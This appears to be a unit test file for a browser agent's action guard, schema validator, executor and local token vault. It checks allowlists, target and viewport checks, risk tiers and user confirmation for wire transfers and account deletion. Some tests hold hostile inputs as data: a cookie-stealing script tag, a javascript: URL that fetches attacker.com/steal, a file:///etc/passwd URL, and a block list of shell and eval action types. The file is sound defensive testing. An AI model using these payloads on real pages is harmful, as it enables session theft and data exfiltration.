/**
 * Comprehensive Unit Tests for Local Action Guard and Browser Executor
 * Strictly adhering to 01_MASTER_SYSTEM_SPEC.md, 03_BROWSER_AGENT_AND_AI_PLAN.md,
 * and 04_ANTIGRAVITY_CODING_EXECUTION_PLAN.md (Phases A13, A14).
 */

import test from 'node:test';
import assert from 'node:assert';
import { ActionGuard } from '../dist/extension/src/agent/action-guard.js';
import { validateActionSchema, ALLOWED_ACTION_TYPES } from '../dist/extension/src/agent/action-schema.js';
import { BrowserExecutor, TokenVault } from '../dist/extension/src/agent/executor.js';

// Mock Page Perception fixture
function createMockPerception(overrides = {}) {
  return {
    viewport: { width: 1280, height: 960 },
    url: 'https://example.com/checkout',
    title: 'Secure Checkout',
    timestamp: Date.now(),
    elements: [
      {
        id: 'submit-order-btn',
        role: 'button',
        text: 'Submit Application',
        bbox: [100, 200, 150, 40],
        visible: true,
        enabled: true,
        source: 'dom',
      },
      {
        id: 'user-email-input',
        role: 'textbox',
        text: '',
        bbox: [100, 100, 300, 40],
        visible: true,
        enabled: true,
        inputType: 'email',
        source: 'dom',
      },
      {
        id: 'disabled-pay-btn',
        role: 'button',
        text: 'Pay Now',
        bbox: [100, 300, 150, 40],
        visible: true,
        enabled: false,
        source: 'dom',
      },
      {
        id: 'hidden-secret-field',
        role: 'textbox',
        text: '',
        bbox: [0, 0, 0, 0],
        visible: false,
        enabled: true,
        source: 'dom',
      },
      {
        id: 'danger-delete-account-btn',
        role: 'button',
        text: 'Delete Account Permanently',
        bbox: [100, 500, 200, 40],
        visible: true,
        enabled: true,
        source: 'dom',
      },
      {
        id: 'transfer-funds-btn',
        role: 'button',
        text: 'Confirm Wire Transfer',
        bbox: [100, 600, 180, 40],
        visible: true,
        enabled: true,
        source: 'dom',
      },
      {
        id: 'read-terms-link',
        role: 'link',
        text: 'Read Terms and Conditions',
        bbox: [100, 700, 220, 30],
        visible: true,
        enabled: true,
        source: 'dom',
      },
    ],
    ...overrides,
  };
}

// -------------------------------------------------------------
// Test Suite 1: Action Allowlist & Schema Validation
// -------------------------------------------------------------
test('Action Schema: Validates allowed actions and rejects unknown actions', () => {
  const allowed = ['click', 'type', 'select', 'scroll', 'navigate', 'focus', 'extract', 'wait'];

  for (const actionType of allowed) {
    const res = validateActionSchema({
      type: actionType,
      target: { id: 'test-id' },
      value: actionType === 'type' || actionType === 'select' ? 'test-value' : undefined,
      url: actionType === 'navigate' ? 'https://example.com' : undefined,
    });
    assert.strictEqual(res.valid, true, `Action ${actionType} should be valid in schema`);
    assert.strictEqual(res.action.type, actionType);
  }

  // Reject malicious / unknown action types
  const forbiddenTypes = ['eval', 'shell_exec', 'system', 'run_script', 'execute_code', 'download_file'];
  for (const badType of forbiddenTypes) {
    const res = validateActionSchema({ type: badType, target: { id: 'x' } });
    assert.strictEqual(res.valid, false, `Forbidden action ${badType} must be rejected`);
    assert.match(res.error, /allowlist/i);
  }
});

test('Action Schema: Rejects script injection, eval, and dangerous protocols', () => {
  // Reject eval
  assert.strictEqual(
    validateActionSchema({
      type: 'type',
      target: { id: 'user-email-input' },
      value: 'eval("alert(1)")',
    }).valid,
    false,
    'Must reject eval() pattern'
  );

  // Reject <script> tags
  assert.strictEqual(
    validateActionSchema({
      type: 'type',
      target: { id: 'user-email-input' },
      value: '<script>alert(document.cookie)</script>',
    }).valid,
    false,
    'Must reject <script> tags'
  );

  // Reject javascript: URLs in navigate
  assert.strictEqual(
    validateActionSchema({
      type: 'navigate',
      url: 'javascript:void(fetch("https://attacker.com/steal"))',
    }).valid,
    false,
    'Must reject javascript: pseudo-protocol'
  );

  // Reject file: URLs in navigate
  assert.strictEqual(
    validateActionSchema({
      type: 'navigate',
      url: 'file:///etc/passwd',
    }).valid,
    false,
    'Must reject file:// protocol'
  );

  // Reject inline onclick injection
  assert.strictEqual(
    validateActionSchema({
      type: 'click',
      target: { id: 'submit-order-btn' },
      reason: 'onclick=alert(1)',
    }).valid,
    false,
    'Must reject inline on* event handler injection'
  );
});

// -------------------------------------------------------------
// Test Suite 2: Action Guard Target & Perception Verification
// -------------------------------------------------------------
test('Action Guard: Verifies target exists in local page perception', () => {
  const guard = new ActionGuard();
  const perception = createMockPerception();

  // Valid target by ID
  const validClick = guard.validateAction(
    {
      type: 'click',
      target: { id: 'submit-order-btn', role: 'button', text: 'Submit Application' },
    },
    perception
  );
  assert.strictEqual(validClick.allowed, true);
  assert.strictEqual(validClick.matchedElement?.id, 'submit-order-btn');

  // Unknown target not in perception
  const missingTarget = guard.validateAction(
    {
      type: 'click',
      target: { id: 'non-existent-button-999' },
    },
    perception
  );
  assert.strictEqual(missingTarget.allowed, false);
  assert.strictEqual(missingTarget.error, 'TARGET_NOT_FOUND');
});

test('Action Guard: Rejects role mismatch and label mismatch', () => {
  const guard = new ActionGuard();
  const perception = createMockPerception();

  // Action expects a button, but element is a link or textbox
  const roleMismatch = guard.validateAction(
    {
      type: 'click',
      target: { id: 'user-email-input', role: 'button' }, // Actually a textbox
    },
    perception
  );
  assert.strictEqual(roleMismatch.allowed, false);
  assert.strictEqual(roleMismatch.error, 'ROLE_MISMATCH');

  // Action expects completely different label
  const labelMismatch = guard.validateAction(
    {
      type: 'click',
      target: { id: 'submit-order-btn', text: 'Totally Unrelated Label XYZ' },
    },
    perception
  );
  assert.strictEqual(labelMismatch.allowed, false);
  assert.strictEqual(labelMismatch.error, 'LABEL_MISMATCH');
});

test('Action Guard: Rejects disabled and invisible elements for interactive actions', () => {
  const guard = new ActionGuard();
  const perception = createMockPerception();

  // Disabled element
  const disabledClick = guard.validateAction(
    {
      type: 'click',
      target: { id: 'disabled-pay-btn' },
    },
    perception
  );
  assert.strictEqual(disabledClick.allowed, false);
  assert.strictEqual(disabledClick.error, 'ELEMENT_DISABLED');

  // Invisible element
  const invisibleType = guard.validateAction(
    {
      type: 'type',
      target: { id: 'hidden-secret-field' },
      value: 'hello',
    },
    perception
  );
  assert.strictEqual(invisibleType.allowed, false);
  assert.strictEqual(invisibleType.error, 'ELEMENT_NOT_VISIBLE');
});

// -------------------------------------------------------------
// Test Suite 3: Viewport Bounds and Staleness Validation
// -------------------------------------------------------------
test('Action Guard: Rejects coordinates outside viewport bounds', () => {
  const guard = new ActionGuard();
  const perception = createMockPerception(); // 1280x960

  // Coordinates outside viewport (x > 1280)
  const outOfBoundsX = guard.validateAction(
    {
      type: 'click',
      target: { coordinates: { x: 2500, y: 500 } },
    },
    perception
  );
  assert.strictEqual(outOfBoundsX.allowed, false);
  assert.strictEqual(outOfBoundsX.error, 'OUT_OF_BOUNDS_COORDINATES');

  // Negative coordinates
  const negativeY = guard.validateAction(
    {
      type: 'click',
      target: { coordinates: { x: 100, y: -50 } },
    },
    perception
  );
  assert.strictEqual(negativeY.allowed, false);
  assert.strictEqual(negativeY.error, 'OUT_OF_BOUNDS_COORDINATES');

  // BBox out of bounds
  const outOfBoundsBbox = guard.validateAction(
    {
      type: 'click',
      target: { id: 'submit-order-btn', bbox: [2000, 1500, 200, 50] },
    },
    perception
  );
  assert.strictEqual(outOfBoundsBbox.allowed, false);
  assert.strictEqual(outOfBoundsBbox.error, 'OUT_OF_BOUNDS_BBOX');
});

test('Action Guard: Rejects stale page perception and URL mismatch', () => {
  const guard = new ActionGuard({ maxStaleAgeMs: 10000 }); // 10 seconds max

  // Stale perception (15 seconds old)
  const stalePerception = createMockPerception({ timestamp: Date.now() - 15000 });
  const staleRes = guard.validateAction(
    {
      type: 'click',
      target: { id: 'submit-order-btn' },
    },
    stalePerception
  );
  assert.strictEqual(staleRes.allowed, false);
  assert.strictEqual(staleRes.error, 'STALE_PERCEPTION');

  // URL mismatch
  const freshPerception = createMockPerception();
  const urlMismatchRes = guard.validateAction(
    {
      type: 'click',
      target: { id: 'submit-order-btn' },
    },
    freshPerception,
    { currentUrl: 'https://evil-spoof.com/phishing' }
  );
  assert.strictEqual(urlMismatchRes.allowed, false);
  assert.strictEqual(urlMismatchRes.error, 'URL_MISMATCH');
});

// -------------------------------------------------------------
// Test Suite 4: Risk Tier Classification & Confirmation Gating
// -------------------------------------------------------------
test('Risk Policy: Low-risk actions are auto-allowed', () => {
  const guard = new ActionGuard();
  const perception = createMockPerception();

  // Scroll action
  const scrollRes = guard.validateAction({ type: 'scroll', direction: 'down', distance: 200 }, perception);
  assert.strictEqual(scrollRes.allowed, true);
  assert.strictEqual(scrollRes.risk, 'low');
  assert.strictEqual(scrollRes.requiresConfirmation, false);

  // Focus action
  const focusRes = guard.validateAction({ type: 'focus', target: { id: 'user-email-input' } }, perception);
  assert.strictEqual(focusRes.allowed, true);
  assert.strictEqual(focusRes.risk, 'low');

  // Extract action
  const extractRes = guard.validateAction({ type: 'extract', target: { id: 'submit-order-btn' } }, perception);
  assert.strictEqual(extractRes.allowed, true);
  assert.strictEqual(extractRes.risk, 'low');

  // Non-destructive link click
  const linkClickRes = guard.validateAction({ type: 'click', target: { id: 'read-terms-link' } }, perception);
  assert.strictEqual(linkClickRes.allowed, true);
  assert.strictEqual(linkClickRes.risk, 'low');
});

test('Risk Policy: Medium-risk form submissions require validation and are approved', () => {
  const guard = new ActionGuard();
  const perception = createMockPerception();

  const submitRes = guard.validateAction(
    {
      type: 'click',
      target: { id: 'submit-order-btn', role: 'button', text: 'Submit Application' },
      reason: 'Submit application form',
    },
    perception
  );

  assert.strictEqual(submitRes.allowed, true);
  assert.strictEqual(submitRes.risk, 'medium');
  assert.strictEqual(submitRes.requiresConfirmation, false);
});

test('Risk Policy: High-risk actions require explicit user confirmation', () => {
  const guard = new ActionGuard();
  const perception = createMockPerception();

  // Case A: Wire transfer without confirmation -> Blocked pending user confirmation
  const transferAction = {
    type: 'click',
    target: { id: 'transfer-funds-btn', text: 'Confirm Wire Transfer' },
    reason: 'Execute wire transfer of funds',
  };

  const unconfirmedTransfer = guard.validateAction(transferAction, perception);
  assert.strictEqual(unconfirmedTransfer.allowed, false, 'High risk transfer must be blocked without confirmation');
  assert.strictEqual(unconfirmedTransfer.requiresConfirmation, true);
  assert.strictEqual(unconfirmedTransfer.risk, 'high');

  // Case B: Wire transfer with user confirmation -> Approved
  const confirmedTransfer = guard.validateAction(transferAction, perception, { userConfirmed: true });
  assert.strictEqual(confirmedTransfer.allowed, true, 'High risk transfer is allowed when userConfirmed is true');
  assert.strictEqual(confirmedTransfer.risk, 'high');
  assert.strictEqual(confirmedTransfer.requiresConfirmation, false);

  // Case C: Destructive account deletion without confirmation -> Blocked
  const deleteAction = {
    type: 'click',
    target: { id: 'danger-delete-account-btn', text: 'Delete Account Permanently' },
    reason: 'Permanently remove account and erase all data',
  };

  const unconfirmedDelete = guard.validateAction(deleteAction, perception);
  assert.strictEqual(unconfirmedDelete.allowed, false);
  assert.strictEqual(unconfirmedDelete.requiresConfirmation, true);
  assert.strictEqual(unconfirmedDelete.risk, 'high');

  // Case D: Destructive account deletion with confirmation -> Approved
  const confirmedDelete = guard.validateAction(deleteAction, perception, { userConfirmed: true });
  assert.strictEqual(confirmedDelete.allowed, true);
});

// -------------------------------------------------------------
// Test Suite 5: Browser Executor & Token Vault Resolution
// -------------------------------------------------------------
test('TokenVault: Stores secrets locally and resolves tokens without leaking', () => {
  const vault = new TokenVault();
  vault.store('[EMAIL_1]', 'alex.morgan@privacy-test.dev');
  vault.store('[NAME_1]', 'Alex Morgan');

  assert.strictEqual(vault.has('[EMAIL_1]'), true);
  assert.strictEqual(vault.has('[NON_EXISTENT]'), false);
  assert.strictEqual(vault.get('[EMAIL_1]'), 'alex.morgan@privacy-test.dev');

  const { resolvedText, tokensResolved } = vault.resolveTokens('Hello [NAME_1], your email is [EMAIL_1]');
  assert.strictEqual(resolvedText, 'Hello Alex Morgan, your email is alex.morgan@privacy-test.dev');
  assert.deepStrictEqual(tokensResolved, ['[NAME_1]', '[EMAIL_1]']);

  vault.clear();
  assert.strictEqual(vault.size(), 0);
});

test('BrowserExecutor: Resolves tokens locally immediately before typing into DOM', async () => {
  const vault = new TokenVault();
  vault.store('[EMAIL_1]', 'alex.secret@synthetic-test.corp');

  const guard = new ActionGuard();
  const executor = new BrowserExecutor(vault, guard);
  const perception = createMockPerception();

  // Mock simulated DOM element
  let elementValue = '';
  let focused = false;
  let dispatchedEvents = [];

  const mockDomInput = {
    id: 'user-email-input',
    value: '',
    focus() {
      focused = true;
    },
    dispatchEvent(evt) {
      dispatchedEvents.push(evt.type || evt);
    },
  };

  const mockDocument = {
    getElementById(id) {
      if (id === 'user-email-input') return mockDomInput;
      return null;
    },
  };

  // Execution: Server sends tokenized value "[EMAIL_1]"
  const result = await executor.execute(
    {
      type: 'type',
      target: { id: 'user-email-input', role: 'textbox' },
      value: '[EMAIL_1]',
    },
    perception,
    {
      document: mockDocument,
      tokenVault: vault,
    }
  );

  // Verify DOM received resolved real secret
  assert.strictEqual(result.success, true);
  assert.strictEqual(mockDomInput.value, 'alex.secret@synthetic-test.corp', 'DOM element must have real resolved secret');
  assert.strictEqual(focused, true, 'Target element must have been focused');
  assert.ok(dispatchedEvents.includes('input'), 'Must dispatch input event');
  assert.ok(dispatchedEvents.includes('change'), 'Must dispatch change event');

  // Verify audit log returns sanitized token, NOT raw secret
  assert.strictEqual(result.valueSanitized, '[EMAIL_1]', 'Audit output must preserve token placeholder, not raw secret');
  assert.deepStrictEqual(result.tokensResolved, ['[EMAIL_1]']);
});

test('BrowserExecutor: Enforces ActionGuard gating and rejects invalid actions', async () => {
  const executor = new BrowserExecutor();
  const perception = createMockPerception();

  // Attempt to execute high-risk wire transfer without confirmation
  const result = await executor.execute(
    {
      type: 'click',
      target: { id: 'transfer-funds-btn', text: 'Confirm Wire Transfer' },
      reason: 'Execute wire transfer',
    },
    perception
  );

  assert.strictEqual(result.success, false, 'Executor must not execute unconfirmed high risk action');
  assert.strictEqual(result.requiresConfirmation, true);
  assert.strictEqual(result.risk, 'high');
});
